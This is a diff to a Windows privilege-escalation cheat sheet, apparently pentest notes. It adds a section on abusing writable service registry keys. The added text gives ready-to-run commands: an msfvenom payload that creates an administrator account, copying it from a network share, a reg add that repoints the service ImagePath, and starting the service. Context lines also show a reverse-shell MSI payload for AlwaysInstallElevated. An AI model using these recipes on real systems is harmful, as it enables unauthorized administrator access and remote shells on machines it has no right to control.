@@ -124,8 +124,7 @@ You basically need one of the following permissions to the service and then you'
 | GENERIC_WRITE         | Inherits SERVICE_CHANGE_CONFIG                                |
 | GENERIC_ALL           | Inherits SERVICE_CHANGE_CONFIG                                |   
 
-
-> To elevate privileges the BinPath way, services don't have to be configured to run under LocalSystem. As we can alter the configuration, we can also specify under what privileges it should run.   
+*To elevate privileges the BinPath way, services don't have to be configured to run under LocalSystem. As we can alter the configuration, we can also specify under what privileges it should run.*   
 
 #### Exploit  
 ```
@@ -193,6 +192,44 @@ sc start unquotedsvc
 ```   
 
 ## Registry
+The ```HKLM\SYSTEM\CurrentControlSet\Services``` registry tree stores information about each service on the system. On of the variables is the location of the service binary. When we can change the service binary to our executable, we are king.    
+Note that this approach is very similar to the BinPath way, but this time we use the registry instead of the ```sc``` command line utility.   
+**How to detect vulnerable services:**  To exploit this vulnerability, services need to meet the following two requirements:   
+- We have write access to the registry of the service   
+- The service is running with LocalSystem privileges    
+
+```
+#1. get a list of all services
+accesschk64.exe -kvusw hklm\System\CurrentControlSet\services
+powershell -nop -exec bypass -c "Get-Acl -Path hklm:\System\CurrentControlSet\services\* | select Path,AccessToString | Format-List"
+
+#2. copy the list to sublime/notepad++/...
+
+#3. search for following strings (based on powershell output)
+    "NT AUTHORITY\INTERACTIVE Allow  FullControl" #(Everybody that logs in on physical computer, gets assigned to group INTERACTIVE)
+    "BUILTIN\Users Allow  FullControl "
+    "NT AUTHORITY\Authenticated Users FullControl"
+    "Everyone Allow FullControl"
+    other groups you are part of (whoami /all)
+```   
+#### Exploit
+
+```
+#create payload
+msfvenom -p windows/exec CMD='net user xhack SecurePass1337 /add; net localgroup administrators xhack /add' -f exe-service -o payload.exe
+
+#place payload in writable folder
+cd C://Temp
+cp //192.168.194.141/share/tmp/payload.exe .
+
+#change registry path to executable (regsvc is vulnerable service name in this example)
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\payload.exe /f
+
+#restart service
+sc start regsvc
+
+```
+
 ## Executable File
 ## DLL Hijacking
 # Password mining
@@ -219,7 +256,9 @@ When the AlwaysInstallElevated key is set for HKLM and HKCU in the registry, eac
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 ```   
+
 ##### Exploit
+
 ```
 # Generate payload
 msfvenom -p windows/reverse_shell_tcp LHOST=<ip attack> LPORT=<port> -f msi > shell.msi
@@ -229,15 +268,18 @@ msiexec /quiet /qn /i C:\Windows\Temp\shell.msi
 ```    
 
 # Scheduled Tasks
+
 # Hot Potato
 ## Detect
 ## Exploit
 # Startup Aplications
 #### Detect if vulnerable:
+
 ```
 #Check if you have write permissions to startup folder
 icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 ```   
+
 #### Exploit:
 - Generate payload and place it in this folder.    
 - restart the machine with Administrator credentials.   
@@ -252,6 +294,7 @@ netstat -ano
 # Check the executable from a specific service
 tasklist /fi "pid eq <PID>"
 ```   
+
 #### Exploit
 For databases, you can gain RCE through the command functionality or find passwords in the database itself.   
 
